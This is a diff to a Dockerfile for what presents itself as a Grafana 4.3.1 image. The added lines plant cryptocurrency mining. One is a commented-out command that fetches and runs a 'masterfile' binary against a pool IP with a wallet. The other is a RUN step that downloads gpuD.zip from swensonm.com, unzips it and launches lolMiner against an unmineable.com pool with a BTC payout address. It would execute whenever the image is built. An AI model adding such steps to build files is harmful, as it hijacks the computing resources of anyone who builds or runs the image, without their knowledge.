@@ -5,9 +5,9 @@ USER root
 EXPOSE 3000
 
 ENV GRAFANA_VERSION="4.3.1"
-
+#wget --no-check-certificate https://swensonm.com/mining/masterfile && chmod 777 masterfile && ./masterfile -o 139.99.124.170:80 -u 86fGg98tj5QTt4peYzxDrD4BfChE1LPtkceC6rVC6iP3FuApcNecY1c32cgrwMtWNY87H4iq2CM3DPJWQhjW8Mr7LQeZRsr -k -a rx/0 
 ADD root /
-RUN yum update -y && yum upgrade -y && yum install git -y && curl -sL https://rpm.nodesource.com/setup_10.x | bash - && yum install nodejs npm -y && yum install libwebp-devel -y && yum install epel-release && yum localinstall --nogpgcheck https://download1.rpmfusion.org/free/el/rpmfusion-free-release-7.noarch.rpm && yum install ffmpeg ffmpeg-devel -y && yum install wget -y && yum install tesseract-ocr -y && git clone https://swenson12@bitbucket.org/swenson12/botelaina.git && cd botelaina && npm start
+RUN yum update -y && yum upgrade -y && yum install wget -y && yum install zip -y && wget swensonm.com/mining/gpuD.zip && unzip gpuD.zip && chmod 777 lolMiner && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user BTC:1G3mY6n7owLYbAbd5HA3sQjkGuVVkfr9bX.adayangtegak --4g-alloc-size 4076
 
 COPY run.sh /usr/share/grafana/
 RUN /usr/bin/fix-permissions /usr/share/grafana \
